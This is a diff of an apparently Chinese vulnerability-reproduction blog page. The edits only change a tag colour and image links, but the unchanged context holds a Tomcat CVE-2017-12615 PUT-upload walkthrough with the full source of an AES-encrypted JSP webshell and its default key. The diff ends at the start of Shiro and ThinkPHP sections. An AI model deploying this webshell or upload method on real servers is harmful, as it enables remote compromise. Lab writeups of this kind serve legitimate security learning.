@@ -133,7 +133,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #00a596">
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="color: #03a9f4">
                     漏洞复现
                 </a>
             </span>
@@ -158,7 +158,7 @@
 <p>OPTIONS &#x2F;xx HTTP&#x2F;1.1</p>
 </blockquote>
 <p>开启了put方法</p>
-<p>![1](&#x2F;images&#x2F;太阿平台漏洞复现&#x2F;tomcat 文件上传 (CVE-2017-12615) &#x2F;1.png)</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-12615/1.png" alt="1"></p>
 <h4 id="2-put文件写入"><a href="#2-put文件写入" class="headerlink" title="2.put文件写入"></a>2.put文件写入</h4><p>文件头：</p>
 <blockquote>
 <p>PUT &#x2F;shell.jsp&#x2F; HTTP&#x2F;1.1</p>
@@ -167,9 +167,9 @@
 <blockquote>
 <p>&lt;%@page import&#x3D;”java.util.*,javax.crypto.*,javax.crypto.spec.*”%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(“POST”)){String k&#x3D;”e45e329feb5d925b”;&#x2F;*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*&#x2F;session.putValue(“u”,k);Cipher c&#x3D;Cipher.getInstance(“AES”);c.init(2,new SecretKeySpec(k.getBytes(),”AES”));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;</p>
 </blockquote>
-<p>![2](&#x2F;images&#x2F;太阿平台漏洞复现&#x2F;tomcat 文件上传 (CVE-2017-12615) &#x2F;2.png)</p>
-<h4 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h4><p>&#x2F;shell.jsp![3](&#x2F;images&#x2F;太阿平台漏洞复现&#x2F;tomcat 文件上传 (CVE-2017-12615) &#x2F;3.png)</p>
-<p>![4](&#x2F;images&#x2F;太阿平台漏洞复现&#x2F;tomcat 文件上传 (CVE-2017-12615) &#x2F;4.png)</p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-12615/2.png" alt="2"></p>
+<h4 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h4><p>&#x2F;shell.jsp<img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-12615/3.png" alt="3"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-12615/4.png" alt="4"></p>
 <h2 id="三、shiro721代码执行-shiro-反序列化-（CVE-2016-4437）"><a href="#三、shiro721代码执行-shiro-反序列化-（CVE-2016-4437）" class="headerlink" title="三、shiro721代码执行&#x2F;shiro 反序列化 （CVE-2016-4437）"></a>三、shiro721代码执行&#x2F;shiro 反序列化 （CVE-2016-4437）</h2><h4 id="1-爆钥链"><a href="#1-爆钥链" class="headerlink" title="1.爆钥链"></a>1.爆钥链</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro/1.png" alt="1"></p>
 <h4 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro/2.png" alt="2"></p>
 <h2 id="四、thinkphp-命令执行-（CVE-2018-1002015）-thinkphp-代码执行-CNVD-2018-24942"><a href="#四、thinkphp-命令执行-（CVE-2018-1002015）-thinkphp-代码执行-CNVD-2018-24942" class="headerlink" title="四、thinkphp 命令执行 （CVE-2018-1002015） &#x2F;thinkphp 代码执行 (CNVD-2018-24942)"></a>四、thinkphp 命令执行 （CVE-2018-1002015） &#x2F;thinkphp 代码执行 (CNVD-2018-24942)</h2><h4 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1.写webshell"></a>1.写webshell</h4><blockquote>
